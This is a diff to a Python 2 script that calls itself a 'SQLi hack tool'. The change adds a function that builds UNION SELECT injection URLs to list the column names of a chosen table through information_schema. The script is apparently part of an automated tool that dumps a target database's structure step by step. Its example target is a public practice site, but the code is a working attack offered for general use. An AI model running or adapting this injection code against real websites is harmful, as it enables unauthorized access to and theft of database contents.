@@ -12,7 +12,7 @@ ____ _              ___      _                     _____
 
 More: https://www.facebook.com/TheCybersTeam
 Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 0.8
+Fast and easy SQLi hack tool Beta 0.9
 """
 print header
 
@@ -119,4 +119,25 @@ def getTables(database,vulCol,columns, url):
 
 tables = getTables(database,vulCol,columns, url)
 print "Tables: "+tables
+
+sys.stdout.write("\nTable: ")
+table = raw_input()
+
+def getColumns(table,database, volCol, columns, url):
+    url = url + "-1 union select "
+    for i in range(1, columns+1):
+        if i != 1 and i != columns+1:
+            url = url + ", "
+        if i == vulCol:
+            url = url + "concat(0x27,0x23,group_concat(unhex(hex(column_name))),0x23,0x27)"
+        else:
+            url = url + str(i)
+
+    url = url + " from+information_schema.columns where table_name='"+table+"'"
+    res = getContent(url)
+    return getVars(res)
+
+
+columns = getColumns(table,database,vulCol,columns, url)
+print "Columns: "+columns
 
